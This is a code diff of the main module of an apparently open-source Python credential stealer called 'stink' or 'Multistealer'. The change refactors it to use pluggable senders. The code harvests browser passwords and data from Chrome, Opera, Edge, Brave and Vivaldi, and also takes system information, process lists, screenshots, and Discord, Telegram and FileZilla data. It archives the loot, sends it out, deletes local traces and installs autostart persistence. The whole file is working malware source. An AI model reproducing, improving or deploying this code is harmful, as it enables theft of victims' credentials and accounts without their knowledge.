@@ -1,28 +1,27 @@
 from sys import argv
-from shutil import rmtree
 from threading import Thread
-from os import path, makedirs
 from multiprocessing import Pool
+from os import path, makedirs, remove
+from shutil import rmtree, make_archive
 
 from stink.helpers import functions
 from stink.enums import Features, Utils
-from stink.utils import Autostart, Sender, Message
+from stink.utils import Autostart, Message
 from stink.helpers.config import MultistealerConfig
 from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram
 
 
 class Stealer(Thread):
 
-    def __init__(self, token: str, user_id: int, features: list = [Features.all], utils: list = []):
+    def __init__(self, senders: list = [], features: list = [Features.all], utils: list = []):
         Thread.__init__(self, name="Stealer")
 
-        self.token = token
-        self.user_id = user_id
-        self.errors = True if Utils.errors in utils else False
-        self.autostart = True if Utils.autostart in utils else False
-        self.message = True if Utils.message in utils else False
+        self.__senders = senders
+        self.__errors = True if Utils.errors in utils else False
+        self.__autostart = True if Utils.autostart in utils else False
+        self.__message = True if Utils.message in utils else False
 
-        self.config = MultistealerConfig()
+        self.__config = MultistealerConfig()
 
         browser_functions = [module for module in [
             Features.passwords,
@@ -33,141 +32,157 @@ class Stealer(Thread):
         ] if module in features or Features.all in features]
         browser_statuses = True if len(browser_functions) > 0 else False
 
-        self.methods = [
+        self.__methods = [
             {
                 "object": Chromium(
                     "Chrome",
-                    self.config.StoragePath,
-                    *self.config.ChromePaths,
+                    self.__config.StoragePath,
+                    *self.__config.ChromePaths,
                     browser_functions,
-                    self.errors
+                    self.__errors
                 ),
                 "status": browser_statuses
             },
             {
                 "object": Chromium(
                     "Opera GX",
-                    self.config.StoragePath,
-                    *self.config.OperaGXPaths,
+                    self.__config.StoragePath,
+                    *self.__config.OperaGXPaths,
                     browser_functions,
-                    self.errors
+                    self.__errors
                 ),
                 "status": browser_statuses
             },
             {
                 "object": Chromium(
                     "Opera Default",
-                    self.config.StoragePath,
-                    *self.config.OperaDefaultPaths,
+                    self.__config.StoragePath,
+                    *self.__config.OperaDefaultPaths,
                     browser_functions,
-                    self.errors
+                    self.__errors
                 ),
                 "status": browser_statuses
             },
             {
                 "object": Chromium(
                     "Edge",
-                    self.config.StoragePath,
-                    *self.config.MicrosoftEdgePaths,
+                    self.__config.StoragePath,
+                    *self.__config.MicrosoftEdgePaths,
                     browser_functions,
-                    self.errors
+                    self.__errors
                 ),
                 "status": browser_statuses
             },
             {
                 "object": Chromium(
                     "Brave",
-                    self.config.StoragePath,
-                    *self.config.BravePaths,
+                    self.__config.StoragePath,
+                    *self.__config.BravePaths,
                     browser_functions,
-                    self.errors
+                    self.__errors
                 ),
                 "status": browser_statuses
             },
             {
                 "object": Chromium(
                     "Vivaldi",
-                    self.config.StoragePath,
-                    *self.config.VivaldiPaths,
+                    self.__config.StoragePath,
+                    *self.__config.VivaldiPaths,
                     browser_functions,
-                    self.errors
+                    self.__errors
                 ),
                 "status": browser_statuses
             },
             {
                 "object": System(
-                    self.config.StoragePath,
+                    self.__config.StoragePath,
                     "System",
-                    self.errors
+                    self.__errors
                 ),
                 "status": True if (Features.system in features or Features.all in features) else False
             },
             {
                 "object": Processes(
-                    self.config.StoragePath,
+                    self.__config.StoragePath,
                     "System",
-                    self.errors
+                    self.__errors
                 ),
                 "status": True if (Features.processes in features or Features.all in features) else False
             },
             {
                 "object": Screenshot(
-                    self.config.StoragePath,
+                    self.__config.StoragePath,
                     "System",
-                    self.errors
+                    self.__errors
                 ),
                 "status": True if (Features.screenshot in features or Features.all in features) else False
             },
             {
                 "object": Discord(
-                    self.config.StoragePath,
+                    self.__config.StoragePath,
                     r"Programs\Discord",
-                    self.errors
+                    self.__errors
                 ),
                 "status": True if (Features.discord in features or Features.all in features) else False
             },
             {
                 "object": Telegram(
-                    self.config.StoragePath,
+                    self.__config.StoragePath,
                     r"Programs\Telegram",
-                    self.errors
+                    self.__errors
                 ),
                 "status": True if (Features.telegram in features or Features.all in features) else False
             },
             {
                 "object": FileZilla(
-                    self.config.StoragePath,
+                    self.__config.StoragePath,
                     r"Programs\FileZilla",
-                    self.errors
+                    self.__errors
                 ),
                 "status": True if (Features.filezilla in features or Features.all in features) else False
             }
         ]
 
-    def __create_storage(self):
+    def __create_storage(self) -> None:
 
-        if not path.exists(self.config.StoragePath):
-            makedirs(self.config.StoragePath)
+        if not path.exists(self.__config.StoragePath):
+            makedirs(self.__config.StoragePath)
         else:
-            rmtree(self.config.StoragePath)
-            makedirs(self.config.StoragePath)
+            rmtree(self.__config.StoragePath)
+            makedirs(self.__config.StoragePath)
 
-    def run(self):
+    def __create_archive(self):
+
+        make_archive(rf"{path.dirname(self.__config.StoragePath)}\{self.__config.ZipName}", "zip", self.__config.StoragePath)
+
+    def __delete_files(self):
+
+        rmtree(self.__config.StoragePath)
+        remove(rf"{path.dirname(self.__config.StoragePath)}\{self.__config.ZipName}.zip")
+
+    def run(self) -> None:
 
         try:
 
             self.__create_storage()
 
-            with Pool(processes=self.config.PoolSize) as pool:
-                pool.map(functions.run_process, [method["object"] for method in self.methods if method["status"] is True])
+            with Pool(processes=self.__config.PoolSize) as pool:
+                pool.map(functions.run_process, [
+                    method["object"] for method in self.__methods if method["status"] is True
+                ])
 
-            Sender(self.config.ZipName, self.config.StoragePath, self.token, self.user_id, self.errors).run()
+            self.__create_archive()
 
-            if self.autostart is True:
-                Autostart(argv[0], self.errors).run()
+            for sender in self.__senders:
+                sender.run(self.__config.ZipName, self.__config.StoragePath, self.__errors)
 
-            if self.message is True:
-                Message(self.errors).run()
+            self.__delete_files()
+
+            if self.__autostart is True:
+                Autostart(argv[0], self.__errors).run()
+
+            if self.__message is True:
+                Message(self.__errors).run()
 
         except Exception as e:
-            if self.errors is True: print(f"[Multistealer]: {repr(e)}")
+            if self.__errors is True: print(f"[Multistealer]: {repr(e)}")
